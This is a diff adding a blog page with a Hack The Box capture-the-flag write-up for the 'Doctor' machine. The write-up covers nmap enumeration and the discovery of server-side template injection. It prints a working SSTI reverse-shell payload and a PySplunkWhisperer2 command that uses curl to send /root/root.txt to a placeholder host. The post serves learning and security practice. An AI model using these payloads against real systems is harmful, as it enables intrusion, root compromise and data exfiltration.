@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Doctor Write-Up | The Cyber Experiment</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="Doctor Write-Up" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This is my writeup of the Doctor machine on Hack The Box. It was a fun box that introduced me to the concept of Server Side Template Injection. The machine has a SSTI vulnerabilty which allows an attacker to gain a foothold on the machine as the web user. In the Apache logs I found a credential that I then used to escalate privileges by abusing built-in functionality of the Splunk Forwarder, which allows arbitrary code execution and is running as the root user." />
+<meta property="og:description" content="This is my writeup of the Doctor machine on Hack The Box. It was a fun box that introduced me to the concept of Server Side Template Injection. The machine has a SSTI vulnerabilty which allows an attacker to gain a foothold on the machine as the web user. In the Apache logs I found a credential that I then used to escalate privileges by abusing built-in functionality of the Splunk Forwarder, which allows arbitrary code execution and is running as the root user." />
+<link rel="canonical" href="/htb/doctor-write-up" />
+<meta property="og:url" content="/htb/doctor-write-up" />
+<meta property="og:site_name" content="The Cyber Experiment" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-03-26T22:36:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Doctor Write-Up" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Doctor Write-Up","dateModified":"2021-03-26T22:36:00+01:00","datePublished":"2021-03-26T22:36:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"/htb/doctor-write-up"},"url":"/htb/doctor-write-up","description":"This is my writeup of the Doctor machine on Hack The Box. It was a fun box that introduced me to the concept of Server Side Template Injection. The machine has a SSTI vulnerabilty which allows an attacker to gain a foothold on the machine as the web user. In the Apache logs I found a credential that I then used to escalate privileges by abusing built-in functionality of the Splunk Forwarder, which allows arbitrary code execution and is running as the root user.","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="The Cyber Experiment" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">The Cyber Experiment</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Doctor Write-Up</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2021-03-26T22:36:00+01:00" itemprop="datePublished">Mar 26, 2021
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>This is my writeup of the Doctor machine on Hack The Box. It was a fun box that introduced me to the concept of Server Side Template Injection. The machine has a SSTI vulnerabilty which allows an attacker to gain a foothold on the machine as the web user. In the Apache logs I found a credential that I then used to escalate privileges by abusing built-in functionality of the Splunk Forwarder, which allows arbitrary code execution and is running as the root user.</p>
+
+<h2 id="scanning--enumeration">Scanning &amp; Enumeration</h2>
+<p>Initial nmap scan of the machine shows Apache running on port 80 and Splunk running on port 8089. As I am not familiar with Splunk; I googled it first. Initial results show that Splunk Forwarder provides functionality for code execution (<a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/splunk-lpe-and-persistence">hacktrickz post</a>). However, to use this we first need a set of valid credentials. So lets first have a look at the web application.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap scan report <span class="k">for </span>10.10.10.209 <span class="o">(</span>10.10.10.209<span class="o">)</span>
+host is up <span class="o">(</span>0.025s latency<span class="o">)</span><span class="nb">.</span>
+not shown: 997 filtered ports
+
+port     state service  version
+22/tcp   open  ssh      openssh 8.2p1 ubuntu 4ubuntu0.1 <span class="o">(</span>ubuntu linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 <span class="o">(</span>rsa<span class="o">)</span>
+|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 <span class="o">(</span>ecdsa<span class="o">)</span>
+|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 <span class="o">(</span>ed25519<span class="o">)</span>
+80/tcp   open  http     apache httpd 2.4.41 <span class="o">((</span>ubuntu<span class="o">))</span>
+|_http-server-header: apache/2.4.41 <span class="o">(</span>ubuntu<span class="o">)</span>
+|_http-title: doctor
+8089/tcp open  ssl/http splunkd httpd
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: splunkd
+|_http-title: splunkd
+| ssl-cert: subject: <span class="nv">commonname</span><span class="o">=</span>splunkserverdefaultcert/organizationname<span class="o">=</span>splunkuser
+| not valid before: 2020-09-06t15:57:27
+|_not valid after:  2023-09-06t15:57:27
+service info: os: linux<span class="p">;</span> cpe: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h2 id="enumerating-the-web-application">Enumerating the Web Application</h2>
+<p>The web page does not seem to contain anything interesting other than an email address revealing the hostname of the machine <code class="language-plaintext highlighter-rouge">info@docters.htb</code>. I add an entry to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file and visit the web page by going directly to <code class="language-plaintext highlighter-rouge">doctors.htb</code>.</p>
+
+<p>This time the web application shows a Secure messaging app. I first create an account and then test the New Mesage functionality for XSS. 
+<img src="/assets/htb/doctor/xss.png" alt="Failed XSS attempt" />
+<em>XSS failed as the input is sanitized by the web application.</em></p>
+
+<p>Next, I analyzed the source code of the web page adn find an interesting comment that links to a ‘hidden’ web page that is apparently still under beta testing. Visiting the <code class="language-plaintext highlighter-rouge">/archive</code> page, I don’t see anything but the source of the web page is actually an XML file contains the titles of all messages. On this page my XSS payload is not escaped, but as it is an XML page and not an HTML page the payload also is not being executed.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"navbar-nav mr-auto"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"nav-item nav-link"</span> <span class="na">href=</span><span class="s">"/home"</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;</span>
+    <span class="c">&lt;!--archive still under beta testing&lt;a class="nav-item nav-link" href="/archive"&gt;Archive&lt;/a&gt;--&gt;</span>
+  <span class="nt">&lt;/div&gt;</span> 
+</code></pre></div></div>
+
+<h2 id="server-side-template-injection">Server Side Template Injection</h2>
+
+<p>I got stuck here and decided to browse the internet for web application attacks. On the Port Swigger website I found an <a href="SSTI">interesting post</a> about Server Side Template Injection (SSTI) which seemed like a plausible option here. So I followed the methodology for identifying SSTI vulnerabilities and created a message with the title <code class="language-plaintext highlighter-rouge">{{7*7}}</code> which was rendered as <code class="language-plaintext highlighter-rouge">49</code> on the <code class="language-plaintext highlighter-rouge">/archive</code> page does confirming the SSTI vulnerabilty.</p>
+
+<p>The SSTI vulnerability allows the execution of python code in context of the web application. In other words, I exploit the SSTI to get a reverse shell using the payload below. I catch the reverse shell using <code class="language-plaintext highlighter-rouge">nc -nlvp 9001</code>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span><span class="n">request</span><span class="p">.</span><span class="n">application</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nb">__import__</span><span class="p">(</span><span class="s">'os'</span><span class="p">).</span><span class="n">popen</span><span class="p">(</span><span class="s">"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span class="se">\"</span><span class="s">&lt;&lt;YOUR_IP_HERE&gt;&gt;</span><span class="se">\"</span><span class="s">,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span class="se">\"</span><span class="s">/bin/sh</span><span class="se">\"</span><span class="s">, </span><span class="se">\"</span><span class="s">-i</span><span class="se">\"</span><span class="s">]);'"</span><span class="p">).</span><span class="n">read</span><span class="p">()}}</span>
+</code></pre></div></div>
+<p><em>SSTI payload for executing a reverse shell.</em></p>
+
+<h2 id="post-exploitation">Post Exploitation</h2>
+<p>The reverse shell is running as the web user. The web user cannot read the flag in <code class="language-plaintext highlighter-rouge">/home/shaun/user.txt</code>. So I start further enumeration by running <a href="linpeas">linpeas.sh</a> on the machine and discover that the web user is part of the <code class="language-plaintext highlighter-rouge">adm</code> group. This is interesting for privilege escalation as the adm group is typically able to read logs, which may contain all kinds of interesting information (so I learned from <a href="adm-group">hacktrickz</a>).</p>
+
+<p>Reading the <code class="language-plaintext highlighter-rouge">/var/logs/apache2/backup</code> log file we find a clear text credential: <code class="language-plaintext highlighter-rouge">Guitar123</code> that was accidentally entered somewhere in a GET parameter. Using this credential I could log in as the Shaun user by using <code class="language-plaintext highlighter-rouge">su shaun</code> and retrieve the user flag.</p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>At this point, I have a set of valid credentials. Looking back to my notes I see that it might now be a good time to look into privilege escalation by abusing the Splunk Forwarder. I confirm that the credentials for Shaun also work for the Splunk Forwarder by testing them on: <code class="language-plaintext highlighter-rouge">http://10.10.10.209:8089/services</code>.</p>
+
+<p>Checking back on the machine I confirm that the Splunk forwarder is running as the root user.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shaun@doctor:/home/web<span class="nv">$ </span>ps aux | <span class="nb">grep </span>splunk
+root        1135  0.1  2.2 265920 91672 ?        Sl   Feb05   0:49 splunkd <span class="nt">-p</span> 8089 start
+root        1137  0.0  0.3  77664 15476 ?        Ss   Feb05   0:00 <span class="o">[</span>splunkd <span class="nv">pid</span><span class="o">=</span>1135] splunkd <span class="nt">-p</span> 8089 start <span class="o">[</span>process-runner]
+shaun     871436  0.0  0.0  17668   724 pts/6    S+   00:23   0:00 <span class="nb">grep</span> <span class="nt">--color</span><span class="o">=</span>auto splunk
+</code></pre></div></div>
+<p><em>Splunk Forwarder running as the root user.</em></p>
+
+<p>I use the <a href="pysplunkwhisperer2">PySplunkWhisperer2</a> tool, which abuses the built-in functionality of Splunk Forwarder to run any code as the root user, to send the contents of the <code class="language-plaintext highlighter-rouge">/root/root.txt</code> to myself over HTTP using curl.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 PySplunkWhisperer2_remote.py <span class="se">\</span>
+        <span class="nt">--host</span> 10.10.10.209 <span class="se">\</span>
+        <span class="nt">--port</span> 8089 <span class="se">\</span>
+        <span class="nt">--username</span> shaun <span class="se">\</span>
+        <span class="nt">--password</span> <span class="s2">"Guitar123"</span> <span class="se">\</span>
+        <span class="nt">--payload</span> <span class="s2">"curl -F 'data=@/root/root.txt' http://YOUR_IP:8000"</span> <span class="se">\</span>
+        <span class="nt">--lhost</span> YOUR_IP
+</code></pre></div></div>
+<p><em>Running the PySplunkWhisperer2 tool to obtain the root flag.</em></p>
+
+
+  </div><a class="u-url" href="/htb/doctor-write-up" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">The Cyber Experiment</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">The Cyber Experiment</li><li><a class="u-email" href="mailto:your-email@example.com">your-email@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/the-cyber-experiment"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">the-cyber-experiment</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>This website serves as learning tool. This website contains blog like posts that describe the usage of various tools and writeups for CTFs and any other topic that I played with.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
